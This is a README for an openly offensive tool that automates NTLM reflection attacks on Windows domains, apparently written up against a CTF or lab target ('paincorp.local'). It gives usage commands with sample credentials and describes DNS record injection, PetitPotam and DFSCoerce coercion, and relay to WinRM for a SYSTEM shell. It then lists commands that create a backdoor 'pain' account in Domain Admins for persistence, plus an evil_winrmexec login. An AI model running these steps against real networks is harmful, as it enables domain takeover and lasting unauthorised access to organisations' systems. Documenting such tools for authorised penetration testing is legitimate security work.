# NTLM Reflection Auto-Exploitation Tool

A powerful automation tool for exploiting NTLM Reflection vulnerabilities to gain Domain Admin privileges on Windows domains.

## 🚀 Features

- **Automated DNS Record Injection** - Adds malicious DNS records for coercion
- **NTLM Relay Attack** - Relays authentication to WinRM for SYSTEM shell
- **Coercion Automation** - Uses multiple coercion techniques (DFSCoerce, PetitPotam, etc.)
- **Background Process Management** - Handles all processes automatically
- **Shell Detection** - Automatically detects when WinRM shell is ready
- **Clean Interface** - Provides clear instructions for shell access

## 📋 Prerequisites

### Required Tools
```bash
# Install dependencies
sudo apt update
sudo apt install python3 python3-pip netcat

# Install required Python packages
pipx uninstall impacket
pipx install git+https://github.com/fortra/impacket.git


# Install netexec (nxc)
pipx uninstall NetExec
pipx install git+https://github.com/Pennyw0rth/NetExec
```

### Required Access
- Valid domain user credentials
- Network access to Domain Controller
- Ability to create DNS records

## 🛠️ Usage

### Basic Syntax
```bash
./auto_ntlm_reflection.py -u 'DOMAIN\\USER' -p 'PASSWORD' -d DOMAIN -dc-name DC_HOSTNAME -ip YOUR_IP -dc-ip DC_IP
```

### Example
```bash
./auto_ntlm_reflection.py -u 'paincorp.local\web_svc' -p 'dksehdgh712!@#' -d paincorp.local -dc-name dc01.paincorp.local -ip 10.10.xx.xx -dc-ip 10.129.xxx.xxx
```

### Parameters
- `-u` : Domain user (format: `DOMAIN\\USER`)
- `-p` : Password for the user
- `-d` : Domain name
- `-dc-name` : Domain Controller hostname
- `-ip` : Your attacking machine IP address
- `-dc-ip` : Domain Controller IP address

## 🔄 Automated Shell Listener

For automatic connection when the shell is ready, use this while loop:

```bash
while ! nc 127.0.0.1 11000 2>/dev/null; do sleep 1; done
```

## 🎯 Proof of Concept

### 1. Verify Shell Access
```cmd
whoami
# Output: nt authority\system
```
![Checking](/auto_ntlm_reflection/01.png)

### 2. Retrieve Root Flag
```cmd
type C:\Users\Administrator\Desktop\root.txt
```

### 3. Create Persistence User
```cmd
net user pain Password@123 /add
net group "domain admins" pain /add
net localgroup administrators pain /add
net user pain
```
![Checking](/auto_ntlm_reflection/02.png)

### 4. Verify Domain Admin Access
```cmd
net group "domain admins"
```

### 5. Establish WinRM Connection (Alternative Access)
```bash
python3 /opt/winrmexec/evil_winrmexec.py -ssl -port 5986 paincorp.local/pain:'Password@123'@dc01.paincorp.local
```
![Checking](/auto_ntlm_reflection/03.png)
![Checking](/auto_ntlm_reflection/04.png)



## 🎥 Attack Flow

1. **DNS Poisoning** - Injects malicious DNS record
2. **Coercion Trigger** - Forces DC to authenticate to attacker
3. **NTLM Relay** - Relays authentication to WinRM service
4. **SYSTEM Shell** - Gains interactive SYSTEM shell on DC
5. **Persistence** - Creates new domain admin user

## 🛡️ Techniques Used

- **DFSCoerce** - DFS namespace coercion
- **PetitPotam** - EFS RPC coercion  
- **NTLM Relay** - Authentication relay to WinRM
- **DNS Admin Abuse** - DNS record modification
- **WinRM Exploitation** - WinRM service compromise

## 📊 Expected Output

When successful, you'll see:
```
[!] SHELL READY! Run this command in a new terminal:
[!] nc 127.0.0.1 11000
[!] Both processes are still running in the background
```

## 🔧 Troubleshooting

### Common Issues

1. **Port 445 in use**
   ```bash
   sudo systemctl stop smbd
   ```

2. **DNS record already exists**
   - Tool automatically handles duplicate records

3. **Shell not responding**
   - Wait 10-30 seconds for WinRM to stabilize
   - Try pressing Enter multiple times
   - Start with simple commands like `whoami`

4. **Connection refused**
   - Ensure ntlmrelayx process is still running
   - Check if coercion triggered successfully

### Process Management
```bash
# Check running processes
ps aux | grep -E '(ntlmrelayx|nxc)'

# Kill all processes manually
pkill -f 'ntlmrelayx'
pkill -f 'nxc smb'
```

## ⚠️ Legal Disclaimer

This tool is for educational and authorized penetration testing purposes only. The authors are not responsible for any misuse or damage caused by this tool. Always ensure you have proper authorization before testing.

## 📝 Notes

- Requires DNS admin privileges or equivalent
- Works best when attacker can create DNS records
- Multiple coercion methods increase success rate
- WinRM shells may be slow to respond initially
- Always clean up created users after testing

## 🎯 Success Indicators

- `nt authority\system` in whoami output
- Ability to read Administrator files
- Successful creation of domain admin user
- WinRM access with new credentials

---

**Author**: PaiN05  
**Tool**: NTLM Reflection Auto-Exploitation  
**Purpose**: Red Team Operations & Penetration Testing